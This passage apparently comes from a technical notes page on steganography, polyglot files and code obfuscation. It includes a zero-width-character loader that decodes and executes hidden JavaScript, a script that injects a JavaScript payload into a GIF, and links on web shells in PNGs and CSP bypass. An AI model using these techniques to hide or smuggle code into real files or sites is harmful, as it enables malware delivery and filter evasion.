﻿﻿‌​‌‍﻿​​‍‌‍‍﻿‌‍​﻿‌‌‍﻿‍‌​﻿​‍​﻿‍​‍‍‌‍﻿‍‌​‌﻿​‍​﻿​‍‍﻿‌​‍﻿‌‌﻿﻿​﻿‍‍‌‌‍‍‌‍‌‍‌﻿‍﻿‌​‌﻿​﻿‍‍​​​‍‌‍‌‍‌‌﻿‍‌​‌﻿‍﻿‍﻿‌​​﻿​﻿﻿﻿​‍‌﻿‍﻿‌‍‍‍﻿﻿​‍‍‍​​‌﻿‍﻿​‍‌​‌﻿‌‍​‍‍​‍﻿‍‍﻿﻿​﻿‍‍‌‌‍﻿‌‌﻿﻿‍‌​﻿‌‍﻿﻿​‍‌﻿‍​‍﻿‌﻿﻿﻿​﻿‍﻿‍​﻿﻿​﻿﻿﻿​﻿‍﻿‍​‌﻿​‍‌﻿‌‌﻿﻿﻿‍‍﻿‌​​﻿‌​‌﻿﻿‍﻿﻿‌‌﻿‍​​﻿‍​‍‍‍​‌​﻿‌‌﻿‍​​‍﻿﻿‍‌﻿​‍﻿﻿﻿‌​﻿​‍​﻿﻿​﻿‍‌‌‍﻿‌​‍﻿﻿﻿​‍﻿﻿﻿﻿‌​﻿﻿​‍‍﻿‌​‍﻿‌‍﻿‍﻿﻿﻿﻿﻿‌‍‍‌‍‍﻿​﻿‍﻿﻿‌﻿﻿‌​​﻿‌﻿‍﻿﻿‌‌﻿‌‌‍﻿​﻿‍﻿﻿​‌﻿‌﻿﻿﻿​‍‌﻿﻿​​‍​‌‍‍​‍‌‍​‍‍﻿‌‍‍﻿‌﻿‌﻿‌​​﻿​‍‌﻿​‌‌﻿﻿‍​﻿‌‍​﻿‍​‌﻿​‍‍﻿​﻿‍﻿​​‍﻿​‍​﻿​﻿﻿﻿‌‍‌﻿​‍​‍‍‌﻿﻿​​‌﻿‌‌‍﻿‌﻿﻿﻿‌‍﻿﻿‌﻿‍‍‍‍﻿﻿​​​‍‌‍‌‍​​‌‍‌﻿​‍​‌​﻿‌﻿‌﻿‌​​﻿​‍‌‍‌‌‍﻿﻿‌﻿‍‌‍‍﻿‌‌﻿﻿‌​‌‍‌‍‍‍‌﻿‍‍​​﻿‍‌﻿​﻿​​​﻿​​‌﻿​​‍﻿​‌‌﻿‌‍‍﻿﻿​​﻿﻿​‌﻿﻿‌‌﻿﻿‌﻿﻿﻿‌‍﻿﻿﻿​﻿﻿‍‌﻿﻿‍﻿﻿﻿‍‍﻿‍​‌﻿‍​﻿﻿‍​‍﻿‍‌​﻿‍﻿​﻿‍﻿‌﻿‍﻿‍‍​​​‍‌﻿‍‍‌‍﻿‍﻿​​‍﻿​‌‍﻿​﻿‍﻿​‍‍﻿‌​‍﻿‌‌‍﻿‌﻿‍﻿‌‍‍﻿﻿​‍﻿﻿‌‍﻿﻿﻿‍﻿﻿‍‍﻿‍​‍﻿‍‌‍﻿‍﻿‍﻿‍‍‍‍​​‍‍​‌‍‍​‍‍‍‌​‍‍‌﻿‍‍‌‍‍‍﻿​‍‍﻿‌‍‍﻿﻿‍‍﻿‍‍‍‍​‍‍‍‌‍‍‍﻿‍‌﻿​‍‌‌﻿﻿​﻿​﻿‌‌﻿﻿​﻿‍﻿‌‌‍‍‌‌‍﻿﻿​​‍‌​‌﻿​‍​﻿​‍‍﻿‌​‍﻿‌‌﻿﻿​﻿‍‍‌‌‍‍‌﻿‍﻿﻿‌​﻿﻿‌﻿﻿﻿​﻿‍‌‌﻿‍‌‌﻿﻿﻿​​‍​​﻿﻿‌‌‌﻿‌​​﻿‌‌﻿﻿‌​‌‍‌‌‍﻿​‍‍﻿‌​​﻿​‍‍‍‌‌‍‍‌‌﻿‍‌‌﻿‍​‌​﻿‌﻿﻿﻿​﻿‌﻿‌‍﻿﻿‌​‍‍‌‌‍﻿﻿​​‍‌‌﻿";l=q.length;s="substring";for(i=0;i<l;i+=4)
		{w="";for(j=0;j<4;j++){w+=(q.charCodeAt(i+j)*5/2)&3};q+=String.fromCharCode(
		parseInt(w,4))};c=q[s](l,l+11);c[c][c](q[s](l+11))(); // by @mihi42</script>
- hide short link ID in Instagram comment: `‍#2hot ma‍ke lovei‍d to ‍her, ‍uupss ‍#Hot ‍#X` gives `2kdhuHX` for `http://bit.ly/` ID.

		let regexp = /(?:\u200d(?:#|@)?)(\w)/g;
		let match;
		let result = "";
		let str = "asmith2155: ‍#2hot ma‍ke lovei‍d to ‍her, ‍uupss ‍#Hot ‍#X";
		// This string contains Unicode Character 'ZERO WIDTH JOINER' (U+200D)
		// "#" (prepend hashtags) or "@" (prepend a username) characters are used to justify capital letters in the middle of a sentence, without breaking it ability to be recognized as hashtag or username
		while((match = regexp.exec(str)) !== null){
			result += match[1]
		}
		result;// "2kdhuHX" prepend it with http://bit.ly/

	- [Turla’s watering hole campaign: An updated Firefox extension abusing Instagram](https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/)
	- [You’ll never guess where Russian spies are hiding their control servers | Ars Technica](https://arstechnica.com/security/2017/06/russian-hackers-turn-to-britney-spears-for-help-concealing-espionage-malware/)
- `snow` append whitespaces to then end of lines

###### Hide data by using permissively

It's still valid, but add extra data will be invisible / ingored when read normaly

- HTML is permissive
	- `<div a="b><span></span></div>` eq. `<html><head></head><body></body></html>`
	- `<div a=b"><span></span></div>` eq. `<html><head></head><body><div a="b&quot;"><span></span></div></body></html>`
	- `<div something="else"<span>test</span></div>` eq. `<html><head></head><body><div something="else" <span="">test</div></body></html>` (attributes: `something` and `<span`)
	
	- [Attribute names - HTML Standard](https://html.spec.whatwg.org/multipage/syntax.html#attributes-2)
	- [Tag omission in text/html - HTML 5.1: 3. Semantics, structure, and APIs of HTML documents](https://www.w3.org/TR/html/dom.html#tag-omission-in-text-html)
	- [8 The HTML syntax — HTML5](https://www.w3.org/TR/html5/syntax.html#tokenization)
	- [void elements](https://www.w3.org/TR/html51/syntax.html#void-elements)
	- [The Actual Browser Problems with Unquoted Attributes | CSS-Tricks](https://css-tricks.com/problems-with-unquoted-attributes/)
	- [Unquoted attribute values in HTML and CSS/JS selectors · Mathias Bynens](https://mathiasbynens.be/notes/unquoted-attribute-values)
	- "A p element’s end tag may be omitted if the p element is immediately followed by an [...]" — [HTML 5.1: 4.4. Grouping content](https://www.w3.org/TR/html/grouping-content.html#the-p-element)
- base64 variant could allow chars outside alphabet (ignored) means you can write text/url with it. [Some decoder ignore only spaces](https://html.spec.whatwg.org/multipage/webappapis.html#atob:space-character) (`atob("Hello world") == "ée£\n+"`)
	- [Stupid certificate tricks | rya.nc](https://rya.nc/cert-tricks.html)
	- [PGP ASCII Art - cem](https://www.cem.me/20150706-pgp-art.html)
- HTTP chunk encoding (browsers) ignore remains chunks after a chunk with zero length
- HTTP Field parameters allow to escape any char in parameter value: `Content-Disposition: application/octet-stream; filename="w\hat th\e\ hel\l is going \on.mp3"` gives "hello"
- `gzip-steg` ftp://ftp.mirrorservice.org/sites/ftp.wiretapped.net/pub/security/steganography/gzip-steg/
	> gzip uses LZ77 which compresses data by storing length/offset pairs that refer back in the uncompressed data stream to previous occurrences of the information being compressed. gzip considers a length of 3 to be the shortest acceptable length. We allow gzip to find the length/offset pairs and then do the following.
	> 
	> If the length is at least 5 then we subtract 1 and set bit 0 to the value of the bit that we need to hide. We have now hidden information in the length without pushing it beyond a valid value.  Drawbacks are a slight decrease in compression (very slight) since we have to disallow lengths of 4 and some of our meddling will decrease the actual matched length by 1. The hidden file is totally invisible to the normal operation of gzip, gunzip et al and (if encrypted) will only be visible to those in the know.
- JSON indentation / whitespaces between tokens

###### Hide data with optional fields

In metadata, comment, extra fields or unused fields

- PNG `tEXt` chunk (comment)
	See also [chunks `zTXt` and `iTXt`](https://sno.phy.queensu.ca/~phil/exiftool/TagNames/PNG.html#TextualData)
    
	```bash
	exiftool "-Comment<=/path/to/secret.txt" dummy.png
	exiftool -b -Comment dummy.png > secret.txt
	```
    
	- PHP contains base64 contains PNG with data encoded in `tEXt` chunk (comment)
		- [When Bad Guys are Pwning Bad Guys... - SANS Internet Storm Center](https://isc.sans.edu/forums/diary/When+Bad+Guys+are+Pwning+Bad+Guys/22410/)
		- [backdoor as stripped from RC-SHELL](https://gist.github.com/anonymous/319ef7124affebec67ebc56bc83cbe87)
- PNG custom chunk
	- [Pozo/punk: Hiding a payload in PNG files with JAVA](https://github.com/Pozo/punk)
	- [Hiding a payload in PNG files with Python](http://blog.brian.jp/python/png/2016/07/07/file-fun-with-pyhon.html)
- gzip stream can optionaly contains additional data and often ignored when not handling files (like HTTP response):
	* extra header (2 Bytes + 256 Bytes max)
	* original filename: N Bytes + 1 Byte (`\0`)
	* creation date: 4 Bytes (POSIX timestamp)
	* comment N Bytes + 1 zero Byte (`\0`)
	
	See `gzip -N`
	
	It's also possible to concatenate gzip stream in one `cat file1.gz file2.gz file3.gz > all.gz`. This could be ignored (the reader read only the first part). See [Concatenation](GZip#Concatenation)
	
	You can also add extra data after gzip stream, some tools/libs ignore them (`gunzip -q`)
- HTTP/1.1 chunk encoding use chunk extension (kind of comment), always ignored https://tools.ietf.org/html/rfc7230#section-4.1.1
- matroska media container can contains additional tags to store fonts, text, image, binary, etc.
- HTTP chunk encoding tailers are often ignored (but visible with the header `Trailer:`)
- HTTP allow unlimited unstandardized headers
- HTTP message using `multipart/*` support multiple resources [subtypes share the same syntax](https://tools.ietf.org/html/rfc2046#section-5.1.1)
- MIME External-Body Subtype: `message/external-body`, in "phantom body"
- JPEG and some videos codecs like H.264 need the number of pixel to be a multiple of 8 or 16 (macroblocks). All this data is encoded, it's clamped to the image size.
	Odd-sized like 1x1 JPEG image will contains 16x16 pixels (or 8x8 pixels)
	That means data could be written in this border area, but never rendered by common JPEG/video librairies. Only if you rewrite the image size before decoding it.
	- [Block splitting](https://en.wikipedia.org/wiki/JPEG#Block_splitting)
	- [Source Coding and Compression](http://iphome.hhi.de/schwarz/assets/pdfs/08_ImageCoding.pdf#page=23)
	- [Comment ajouter une légende invisible à une image JPEG. - YouTube](https://www.youtube.com/watch?v=RuqAV_By7ig)
	- [JPEG effets de bord et sous-échantillonnage chroma - YouTube](https://www.youtube.com/watch?v=V7LvgXqsh60)
- [NTFS Alternate Data Streams: Hiding data in plain sight since 1993 – EventSentry Blog](https://www.eventsentry.com/blog/2008/07/ntfs-alternate-data-streams-hi.html)
- embedded font or image in PDF, HTML, SVG, etc.

- [ExifTool FAQ](https://sno.phy.queensu.ca/~phil/exiftool/faq.html#Q10) - "How does ExifTool handle coded character sets?", type-specific details are given below about comment handling for EXIF, IPTC, XMP, PNG, ID3, PDF, Photoshop, QuickTime, AIFF, RIFF, MIE and Vorbis information

###### Hide data in pixels

Better if image is lossless

Ex: use PNG 64-bit RGBA to store less visible data, images in PDF

Can use 1 or more color channels

```js
/*
https://en.wikipedia.org/wiki/Steganography#Digital_steganography
https://en.wikipedia.org/wiki/File:StenographyOriginal.png https://upload.wikimedia.org/wikipedia/commons/a/a8/Steganography_original.png (access-control-allow-origin: *)
*/
(async() => {
    const img = Object.assign(new Image(), {crossOrigin: "anonymous", src: "https://upload.wikimedia.org/wikipedia/commons/a/a8/Steganography_original.png"});
    await img.decode();
    const {width, height} = img;
    const canvas = Object.assign(document.createElement("canvas"), {width, height});
    const context = canvas.getContext("2d");
    context.drawImage(img, 0, 0);
    const imageData = context.getImageData(0, 0, width, height);
    for(let {data} = imageData, i = data.length; i--;)
        data[i] = parseInt(data[i].toString(2).substr(-2), 2) * 85;
    context.putImageData(imageData, 0, 0);
    document.body.appendChild(canvas);
})();
```

- [owencm/js-steg: Javascript JPEG steganography library. Includes JS JPEG encoder and decoder with coefficient access helper functions.](https://github.com/owencm/js-steg)
- [Small JS library that packs your files into a PNG](https://github.com/claus/PNGDrive)
- [skeeto/pngarch: Archive files inside a PNG image](https://github.com/skeeto/pngarch)
- Compress data / JS code using pixels of a PNG: [Compression using Canvas and PNG-embedded data - Nihilogic](http://wayback.archive.org/web/20131209074604/http://blog.nihilogic.dk/2008/05/compression-using-canvas-and-png.html)
- [Colin Keigher: Going viral on Imgur with Powershell and PNG](http://colin.keigher.ca/2016/12/going-viral-on-imgur-with-powershell.html)
- [Using ImageMagick to reveal existence of hidden steganographic messages with DIY IM-simpleGUI tool | Guidance Blog](http://saisa.eu/blogs/Guidance/?p=1128)
- Hide data in Youtube video [Hijacking Youtube to transmit your Data – Hiding in plain sight](https://banmeihack.wordpress.com/2016/07/26/hijacking-youtube-to-transmit-your-data/) and [Hijacking YouTube to transmit your data | Hacker News](https://news.ycombinator.com/item?id=12166332)
- [week4 : 3 : Steganography and Image hiding](https://codepen.io/garethesn/pen/jbaarj)
- [petereigenschink/steganography.js: Hide secret messages with JavaScript and this library](https://github.com/petereigenschink/steganography.js/)
- [Virus Bulletin :: Script in a lossy stream](https://www.virusbulletin.com/virusbulletin/2015/03/script-lossy-stream)
	> You can perturb the input of the DCT so that a specific IDCT implementation will generate the desired output
	> 
	> In general signal-processing terms, this is known as preemphasis/equalisation --- since the communications channel will distort the signal in a known way, by sending a signal distorted appropriately in the opposite direction, it will arrive "undistorted" at the destination.
	> 
	> You can also consider using ECC codes, so that any small errors introduced can be corrected.
	> — https://news.ycombinator.com/item?id=17589503
- [Another nasty trick in malicious PDF](https://blog.avast.com/2011/04/22/another-nasty-trick-in-malicious-pdf/)

###### Hide data with combination

Prepend or append data. Easily detectable.

- ZIP and RAR can have prepend data before header
	>  The spec is specifically that the last header is the only valid header
	
	`zip` return a warning "extra bytes at beginning or within zipfile"

	- [Doesn't respect zip format · Issue #148 · gildas-lormeau/zip.js](https://github.com/gildas-lormeau/zip.js/issues/148)

	Ex: prepend data with a valid image
	
    ```sh
	zip -r secret.zip file1 file2
	cat cat.gif secret.zip > fun.gif
	# Upload fun.gif
	unzip fun.gif
    ```

###### VeraCrypt partition hidden in MP4 video

![VeraCrypt partition in MP4 file](http://keyj.emphy.de/files/tcsteg.svg)

- [KeyJ's Blog : Blog Archive » Real Steganography with TrueCrypt](http://keyj.emphy.de/real-steganography-with-truecrypt/)

###### Hidden partition in encrypted partition

Require 2 passwords. You can provide the first one if forced if the existance of the encrypted container is known (susception of encrypted data, ex: an image contains steganography data). But the revelated data can't prove an hidden data exist

volume: decoy (encrypted data) + outer (encrypted data of the hidden volume)

![The layout of a standard VeraCrypt volume before and after a hidden volume was created within it](https://download-codeplex.sec.s-msft.com/Download?ProjectName=veracrypt&DownloadId=931263)
![Example Layout of System Drive Containing Hidden Operating System](https://download-codeplex.sec.s-msft.com/Download?ProjectName=veracrypt&DownloadId=931269)

- can start the decoy operation system (normaly)
- can load additional volume
- can start the hidden operating system (require password)

- [Deniable encryption — Wikipedia](https://en.wikipedia.org/wiki/Deniable_encryption)
- [Plausible deniability — Wikipedia](https://en.wikipedia.org/wiki/Plausible_deniability)
- [Déni plausible (cryptologie) — Wikipédia](https://fr.wikipedia.org/wiki/D%C3%A9ni_plausible_%28cryptologie%29)
- [VeraCrypt - Documentation](https://veracrypt.codeplex.com/wikipage?title=Hidden%20Volume) - Hidden Volume
- [Add smart card support for outer and hidden volumes · Issue #2 · ggkitsas/cryptostick-truecrypt](https://github.com/ggkitsas/cryptostick-truecrypt/issues/2) - Volume Format
- [VeraCrypt - Documentation](https://veracrypt.codeplex.com/wikipage?title=VeraCrypt%20Hidden%20Operating%20System) - Hidden Operating System
- [VeraCrypt : comment chiffrer et cacher un OS complet](https://www.nextinpact.com/news/103280-veracrypt-comment-chiffrer-et-cacher-os-complet.htm)

###### Polyglot files

Note: About polyglot files contains HTML/JS. With Web browser, it could be blocked by `X-Content-Type-Options: nosniff` (for `<script src="image.jpg">`) to prevent CSP bypass. See:

Note: ZIP (APK, ODT, DOCX, JAR…), 7z, RAR, HTML, PDF (header must be in the first 1024 bytes) are not enforced to have the signature at offset 0 (could be prepend with something else)

- [1288361 – Return a network error for requests whose type is "script" and response has a MIME type that starts with image/](https://bugzilla.mozilla.org/show_bug.cgi?id=1288361)
- [433049 - Security: Block scripts that start with a valid image header - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=433049)
- [Polyglot (computing) — Wikipedia](https://en.wikipedia.org/wiki/Polyglot_%28computing%29)
- [Schedule 31. Chaos Communication Congress](http://wayback.archive.org/web/20150423114933/https://events.ccc.de/congress/2014/Fahrplan/events/5930.html)
- https://events.ccc.de/congress/2014/Fahrplan/system/attachments/2562/original/Funky_File_Formats.pdf
- [Polyglot Inception: JPEG = CSS = JS = HTML](http://incept10n.com/)
- [International Journal of Proof-of-Concept or Get The Fuck Out (PoC||GTFO)](https://www.alchemistowl.org/pocorgtfo/)
	> 0x15 is a laser-projectable PDF that's also a ZIP containing, among other things, another PDF that is also a Git repo of its own source code.
	> 0x16 is a polyglot that is valid as a PDF document, a ZIP archive, and a Bash script that runs a Python webserver which hosts Kaitai Struct’s WebIDE which, allowing you to view the file’s own annotated bytes.
	> 0x17 is a PDF that's also a valid ZIP and valid firmware for Apollo Guidance Computer.
- Bulletproof Images: Hide payload in JPEG which will keep unchanged after libgd transformations
	Detect what bytes are not recreated after parsed and saved (image recreation)

	JPEG:
	- [Обход безопасной загрузки изображений - RDot](https://rdot.org/forum/showthread.php?t=2780) (generate an error, but works with GD)
	- [Bulletproof JPEGs - virtualabs.fr](http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l)
	PNG:
	- [Encoding Web Shells in PNG IDAT chunks | Application Security](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
	GIF:
	- [Exploiting PHP-GD imagecreatefromgif() function](https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif) - Proof-of-concept to exploit the flaw in the PHP-GD built-in function, `imagecreatefromgif()` 
- [pocorgtfo/README.md at master · angea/pocorgtfo](https://github.com/angea/pocorgtfo/blob/master/writeups/19/README.md#rename-extension) - HTML parser can be stopped by `<script>document.documentElement.innerHTML = document.getElementById("mypage").innerHTML;</script>`: "The page payload escapes out of the whole file so that the browser stops loading the whole file (which is 64 Mb)."
- [pocorgtfo/README.md at master · angea/pocorgtfo](https://github.com/angea/pocorgtfo/blob/master/writeups/19/README.md#write-up) - Polyglot PDF - ZIP - HTML file
- [How to create polyglot HTML/JS/Wasm module | WebAssembly Security](https://webassembly-security.com/polyglot-webassembly-module-html-js-wasm/)

###### Polyglot JPEG - ZIP file

Could also works with all other formats that support ICC: TIFF, GIF, JPEG 2000, [PSD](http://justsolve.archiveteam.org/wiki/Photoshop_Image_Resources)

ZIP data in JPEG survive image processing (resize, stripping EXIF data, recompressing, etc.)

Use ICC profiles, ICC profile chunk size limits (65376 for the first file, else 65521 for the others, this why the zip for bigger files must contains multipart .rar)

> In a JPEG file, an APP2 marker with an identifier of "ICC_PROFILE" is used for ICC profiles. See the ICC profile specification for details. Note that large ICC profiles must be split up, to accommodate JPEG's 64KB segment size limit. 

> Yes, if you open the file as text you will find the magic number of icc profile (acsp) follwoed by a bunch of random bytes and that of zip (PK/x03/x04). It is quite easy to append arbitrary data to JPEG files [0] and however there is no guarantee that it will survive image processing, so it was necessary to hide it within an ICC　profile. As for zip, unzip will happily decode any data stream as long as it makes sense and ignore the parts that don't.

> It isn't massively complex, but it did require some custom encoding/decoding logic.

- [Dаvіd Вucһаnаn on Twitter: "Assuming this all works out, the image in this tweet is also a valid ZIP archive, containing a multipart RAR archive, containing the complete works of Shakespeare. This technique also survives twitter's thumbnailer :P… https://t.co/glgrQSz7cK"](https://twitter.com/David3141593/status/1057042085029822464)
- [Dаvіd Вucһаnаn on Twitter: "Source code. This one is also a PDF :P… "](https://twitter.com/David3141593/status/1057609354403287040)
- [JPEG image of Shakespeare which is also a zip file containing his complete works | Hacker News](https://news.ycombinator.com/item?id=18342042)
- [Command-line Options @ ImageMagick](http://www.imagemagick.org/script/command-line-options.php#profile)
    
	```sh
	curl 'https://pbs.twimg.com/media/DqteCf6WsAAhqwV.jpg' > tmp.zip  && unzip tmp.zip && unrar e shakespeare.part001.rar
	curl 'https://pbs.twimg.com/media/Dq1iEpfXgAADZRg.jpg' > tmp.pdf  && unzip tmp.pdf
	```
	
	```
	binwalk DqteCf6WsAAhqwV.jpg
	DECIMAL       HEXADECIMAL     DESCRIPTION
	--------------------------------------------------------------------------------
	0             0x0             JPEG image data, JFIF standard 1.01
	182           0xB6            Zip archive data, at least v1.0 to extract, ..., name: shakespeare.part001.rar
	...
	1971177       0x1E13E9        End of Zip archive
	```

###### Polyglot JPEG - HTML file

This webpage is also a JPEG image: http://lcamtuf.coredump.cx/squirrel/.

1. The file is a valid jpeg file with some html in metadata
2. The server responds with `Content-Type: text/html`, making browser interpret the response body as html
3. Content before `<html>` tag are included in body (permissive behavior or HTML5), needed to be hidden
4. The html in the jpeg metadata ends with `<!--` , which starts html comment
5. The html has `<img src="#">` that renders the file as image (self reference)

```sh
exiftool -comment='<style>*{visibility: hidden;} div{visibility: visible; position: absolute;}</style><div><h1>Web Scale Big Database</h1><img src="#"><!--' image.jpg
mv image.jpg index.html
```

See https://www.reddit.com/r/programming/comments/4wak58/this_html_page_is_also_a_jpeg/d65fe6m

###### Polyglot GIF - JS file

[Funky File Formats \[31c3\] - YouTube](https://www.youtube.com/watch?v=Ub5G_t-gUBc&t=571) and https://speakerdeck.com/ange/funky-file-formats-31c3?slide=42

```py
header = (
	b'\x47\x49\x46\x38\x39\x61'  #Signature + Version  GIF89a
	b'\x2F\x2A' #Encoding /* it's a valid Logical Screen Width
	b'\x0A\x00' #Smal Logical Screen Height
	b'\x00' #GCTF
	b'\xFF' #BackgroundColor
	b'\x00' #Pixel Ratio
	b'\x2C\x00\x00\x00\x00\x2F\x2A\x0A\x00\x00\x02\x00\x3B' #GlobalColorTable + Blocks
	b'\x2A\x2F' #Commenting out */
	b'\x3D\x31\x3B' # enable the script side by introducing =1;
)
trailer = b'\x3B'
# I made this explicit, step by step .
f.write(header)
f.write(payload)
f.write(trailer)

///////
"""
Injects the payload into existing GIF
NOTE: if the GIF contains \xFF\x2A and/or \x2A\x5C might caouse issues
"""
# I know, I can do it all in memory and much more fast.
# I wont do it here.
with open(fname + "_malw.gif", "w+b") as fout:
	with open(fname, "rt") as fin:
		for line in fin:
			ls1 = line.replace(b'\x2A\x2F', b'\x00\x00')
			ls2 = ls1.replace(b'\x2F\x2A', b'\x00\x00')
			fout.write(ls2)
	fout.seek(6,0)
	fout.write(b'\x2F\x2A') #/*
	
f = open(fname + "_malw.gif", "a+b") #appending mode
f.write(b'\x2A\x2F\x3D\x31\x3B')
f.write(payload)
f.write(b'\x3B')
```

An other example:

- [Perl::Visualize - search.cpan.org](http://search.cpan.org/~jnagra/Perl-Visualize-1.02/Visualize.pm) and http://cpansearch.perl.org/src/JNAGRA/Perl-Visualize-1.02/Visualize.pm
- [ThinkFu › GIF/Javascript Polyglots](http://www.thinkfu.com/blog/gifjavascript-polyglots)

###### Polyglot JPEG - JS file

- [PortSwigger Web Security Blog: Bypassing CSP using polyglot JPEGs](http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html)
- [JS Bin - Collaborative JavaScript Debugging](https://jsbin.com/kenuka/edit?html,output)
- http://portswigger-labs.net/csp/csp.php?x=%3Cscript%20charset=%22ISO-8859-1%22%20src=%22http://portswigger-labs.net/polyglot/jpeg/xss.jpg%22%3E%3C/script%3E
- [XSS and injection vulnerabilities](#xss-and-injection-vulnerabilities)

###### Polyglot PNG

> The idea is that PNG data can be interpreted depending on the Color Type among other types as RGB values (color type =2) or as indexed values (color type =3) together with a palette (PLTE). 

- [PNG Merge - YobiWiki](http://wiki.yobi.be/wiki/PNG_Merge)

###### Polyglot JSON - JS file

- [JSON hijacking for the modern web | Blog](https://portswigger.net/blog/json-hijacking-for-the-modern-web)
- [Why Facebook's api starts with a for loop - DEV Community 👩‍💻👨‍💻](https://dev.to/antogarand/why-facebooks-api-starts-with-a-for-loop-1eob)
- [Crafty Tricks for Avoiding XSSI | patorjk.com](http://patorjk.com/blog/2013/02/05/crafty-tricks-for-avoiding-xssi/)
- [api - How does including a magic prefix to a JSON response work to prevent XSSI attacks? - Information Security Stack Exchange](https://security.stackexchange.com/questions/110539/how-does-including-a-magic-prefix-to-a-json-response-work-to-prevent-xssi-attack)

###### Angecryption

> With Angecryption, you can basically encrypt anything into whatever you want

AES(A) = B; where A and B are documents (image, pdf, etc.)

```sh
python2.7 angecrypt.py source target result [key] [algo] > decrypt.py
# where algo could be aes
#python2.7 -m pip install --user pycrypto
```

- [Fortinet Blog](https://blog.fortinet.com/2014/03/31/angecryption-at-insomni-hack)
- https://github.com/cryptax/angepoc
- https://code.google.com/archive/p/corkami/
- [when AES(☢) = ☠ --- a crypto-binary magic trick](http://www.slideshare.net/ange4771/when-aes-a-cryptobinary-magic-trick)
- [Joue à la crypto ! (french) // Speaker Deck](https://speakerdeck.com/ange/joue-a-la-crypto-french)
- https://www.blackhat.com/docs/eu-14/materials/eu-14-Apvrille-Hide-Android-Applications-In-Images.pdf
- [Encrypting a PNG into an Android application](https://github.com/cryptax/angeapk)

###### IP-over-DNS

> iodine lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed.

- [kryo.se: iodine (IP-over-DNS, IPv4 over DNS tunnel)](https://code.kryo.se/iodine/)

##### Esoteric programming languages

- [Esoteric programming language — Wikipedia](https://en.wikipedia.org/wiki/Esoteric_programming_language)
- [Brainfuck — Wikipedia](https://en.wikipedia.org/wiki/Brainfuck)
- [Brainfuck - Esolang](https://esolangs.org/wiki/Brainfuck)
- [Whitespace (programming language) — Wikipedia](https://en.wikipedia.org/wiki/Whitespace_%28programming_language%29)
- [Malbolge — Wikipedia](https://en.wikipedia.org/wiki/Malbolge)
- [Brainfuck minifier](https://mothereff.in/brainfuck-minifier) - [A brainfuck minifier written in JavaScript](https://github.com/mathiasbynens/brnfckr)
- [AA86 - Symbolic assembler demo](http://utf-8.jp/public/sas/) - Generate MS-DOS COM file with only symbols
- [Non-alpha PHP code](http://wayback.archive.org/web/20150319140303/http://sla.ckers.org/forum/read.php?24,36986)

###### JSFuck and similar

Valid JavaScript, use implicit type coercion.

See also [Obfuscation (code)](#obfuscation2028code29)

- [JSFuck — Wikipedia](https://en.wikipedia.org/wiki/JSFuck)
- [JSFuck - Write any JavaScript with 6 Characters: \[\]()!+](http://www.jsfuck.com/) - see https://github.com/aemkei/jsfuck/blob/master/jsfuck.js
- [JSF*ck - \[\]()!+](http://utf-8.jp/public/jsfuck.html) - **Broken**
- [Brainfuck beware: JavaScript is after you! | Patricio Palladino](http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html) and https://github.com/alcuadrado/hieroglyphy
- [Converts javascript command into no alnum version using only []()+! characters](http://discogscounter.getfreehosting.co.uk/js-noalnum_com.php)
- [Java/script: no alnum cheat sheets](http://wayback.archive.org/web/20150420005536/http://sla.ckers.org/forum/read.php?24,33349,33405)
- [YAUC Less chars needed to run arbitrary JS code = 6! (JS GREAT WALL)](http://wayback.archive.org/web/20150319154336/http://sla.ckers.org/forum/read.php?24,32930)
- [Diminuitive NonAlNum JS - Arbitrary](http://wayback.archive.org/web/20111230091043/http://sla.ckers.org/forum/read.php?24,35081)
- [Diminutive JS Code Challenge, from OWASP](http://wayback.archive.org/web/20110708231619/http://sla.ckers.org/forum/read.php?24,30015)
- [Diminutive NoAlNum JS Contest](http://wayback.archive.org/web/20150319163133/http://sla.ckers.org/forum/read.php?24,28687)
- [Hackvertor](https://hackvertor.co.uk/public) [Hackvertor](http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php) - see ("Hacker" >) 3chr_nonalpha, aaencode, phpnonalpha, phpnonalpha2, hasegawa, etc.
- [aaencode - Encode any JavaScript program to Japanese style emoticons (^_^)](http://utf-8.jp/public/aaencode.html)
- [jjencode - Encode any JavaScript program using only symbols](http://utf-8.jp/public/jjencode.html)
- [Diminuitive NonAlNum JS - Arbitrary](http://wayback.archive.org/web/20111230091043/http://sla.ckers.org/forum/read.php?24,35081)
- [New JavaScript obfuscator: JScrambler](http://wayback.archive.org/web/20111230080027/http://sla.ckers.org/forum/read.php?24,33722)
- [Code Obfuscation Algorithms](http://wayback.archive.org/web/20131109221321/http://sla.ckers.org/forum/read.php?24,28674)
- [String hacks (ways to make a string)](http://wayback.archive.org/web/20131109230330/http://sla.ckers.org/forum/read.php?24,28642)
- [deobfuscation - How does this obfuscated javascript code work? - Stack Overflow](https://stackoverflow.com/questions/21955230/how-does-this-obfuscated-javascript-code-work/21955587)
- [obfuscation - Obfuscated javascript code with binary values? - Stack Overflow](https://stackoverflow.com/questions/3910353/obfuscated-javascript-code-with-binary-values)
- [obfuscation - How does this magic Javascript work? - Stack Overflow](https://stackoverflow.com/questions/22588223/how-does-this-magic-javascript-work)
- [KoreBlog javascript_deobfuscation](https://blog.korelogic.com/blog/2015/01/12/javascript_deobfuscation)
- [Edit fiddle - JSFiddle](http://jsfiddle.net/e6na63L8/)
- [DW56-1-JSObfuscation.pdf](http://www.digitalwhisper.co.il/files/Zines/0x38/DW56-1-JSObfuscation.pdf)
- [mame/jsfuck-quine: A JavaScript Quine written in the JSFuck style](https://github.com/mame/jsfuck-quine)
- [שלום עולם – JavaScript Written in the Hebrew Alphabet](http://aem1k.com/%D7%A9%D7%9C%D7%95%D7%9D-%D7%A2%D7%95%D7%9C%D7%9D/)
- [aurebesh.js – Translate JavaScript to Other Writing Systems](http://aem1k.com/aurebesh.js/)
 
- `13 + !0 === 14`
- `null == undefined`
- `+"3" === 3`, `isFinite(null) === true` (unary plus converting something into a number)
